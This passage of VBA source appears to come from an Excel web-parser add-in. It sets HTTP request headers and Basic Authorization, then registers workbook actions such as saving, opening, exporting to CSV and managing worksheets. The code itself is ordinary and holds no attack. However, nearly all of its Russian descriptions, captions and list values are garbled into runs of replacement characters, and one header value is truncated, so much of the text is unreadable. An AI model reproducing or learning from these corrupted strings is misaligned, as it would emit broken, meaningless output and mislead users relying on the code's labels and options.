    On Error Resume Next
    If RequestHeadersStore Is Nothing Then Set RequestHeadersStore = New Dictionary
    RequestHeadersStore.CompareMode = TextCompare
    If ContentType$ = "" Then ContentType$ = "application/x-www-form-urlencoded"

    RequestHeadersStore.item("Accept") = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    RequestHeadersStore.item("Accept-Language") = "u-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4"
    RequestHeadersStore.item("Connection") = "keep-alive"
    RequestHeadersStore.item("Content-Type") = ContentType$
    RequestHeadersStore.item("Upgrade-Insecure-Requests") = "1"
    RequestHeadersStore.item("X-Compress") = "null"
    RequestHeadersStore.item("User-Agent") = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36"

    If Len(URL) Then
        Dim OriginURL$, HostURL$
        OriginURL$ = GetBaseURL(URL)
        HostURL$ = Split(OriginURL$, "//")(1)

        If IsURL(OriginURL$) Then RequestHeadersStore.item("Origin") = OriginURL$
        If Len(HostURL$) Then RequestHeadersStore.item("Host") = HostURL$
        RequestHeadersStore.item("Referer") = URL
    End If
End Sub

Function GetBasicAuthorizationString(ByVal Login$, ByVal pwd$) As String
    On Error Resume Next: GetBasicAuthorizationString = EncodeBase64(Login$ & ":" & pwd$)
End Function

Sub SetBasicAuthorizationHeader(ByVal Login$, ByVal pwd$, Optional GlobalHeader As Boolean = False)
    On Error Resume Next
    http.SetRequestHeader "Authorization", "Basic " & GetBasicAuthorizationString(Login$, pwd$)
    If GlobalHeader Then
        If RequestHeadersStore Is Nothing Then Set RequestHeadersStore = New Dictionary
        RequestHeadersStore.item("Authorization") = "Basic " & GetBasicAuthorizationString(Login$, pwd$)
    End If
End Sub
Attribute VB_Name = "mod_AAs_Workbook_and_Sheet"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_Workbook_and_Sheet                    Version:
' Author        : Igor Vakhnenko                   Date: 17.03.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text: Option Private Module

Sub InitializeActions_Workbook(ByRef AAs As ArrayActions)
    On Error Resume Next
    
    With AAs.AddAction(fc_Workbook, "SaveWorkbook", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| " & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|(|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & _
            "c:\folder\filename.xlsx, - |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & _
            "\folder\filename.xls - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Parser.xla)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| - \folder\) - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (.xls, .xlsx, .xlsb |fffd| |fffd|.|fffd|.)"
        .AddParameter "Filename", aps_Text, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "\files\{ParserName} {time=DD.MM.YYYY HH-NN-SS}.xlsx"
        .AddParameter "CloseWorkbook", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Workbook, "OpenWorkbook", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| Excel")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| Excel (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| MS Excel)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| dialog, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
            " - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, c:\folder\filename.xls" & vbNewLine & _
            " - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| parser.xla, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| \, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, \filename.xls" & vbNewLine & _
            " - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, filename.xls"
        
        .AddParameter "Filename", aps_Text, "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Mode", aps_List, "|fffd||fffd||fffd||fffd||fffd|", Array("1 - Output", "2 - ReadOnly"), "1 - Output"
    End With
    
    
    With AAs.AddAction(fc_Workbook, "CloseWorkbook", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Mode", aps_List, "|fffd||fffd||fffd||fffd||fffd|", Array("1 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", "2 - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "1 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Workbook, "CreateWorkbook", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & _
            "c:\folder\filename.xlsx, - |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & _
            "\folder\filename.xls - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Parser.xla)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| - \folder\) - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (.xls, .xlsx, .xlsb |fffd| |fffd|.|fffd|.)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), - |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|."
        .AddParameter "Filename", aps_Text, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "\files\{ParserName} {time=DD.MM.YYYY HH-NN-SS}.xlsx"
        .AddParameter "Template", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd|", , ""
    End With
    
    With AAs.AddAction(fc_Workbook, "ExportToCSV", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| CSV")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| CSV (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & _
            "c:\folder\filename.csv, - |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & _
            "\folder\filename.csv - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Parser.xla)" & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| - \folder\) - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Filename", aps_Text, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "\files\{ParserName} {time=DD.MM.YYYY HH-NN-SS}.csv"
        .AddParameter "Encoding", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| CSV |fffd||fffd||fffd||fffd||fffd|", Array("utf-8", "windows-1251"), "utf-8"
        .AddParameter "Options", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", , "ColumnsSeparator=;&RowsSeparator={NL}&Brackets=1&ColumnsCount=auto"
    End With
    
    With AAs.AddAction(fc_Workbook, "CreateWorksheet", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel."
        .AddParameter "Name", aps_Text, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "FillHeaders", aps_List, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Workbook, "ActivateWorksheet", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel." & vbNewLine & _
            "(|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|1|fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|1|fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel."
        .AddParameter "Name", aps_Text, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Workbook, "DeleteWorksheet", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel." & vbNewLine & _
            "(|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|1|fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|1|fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Name", aps_Text, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Workbook, "ClearWorksheet", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
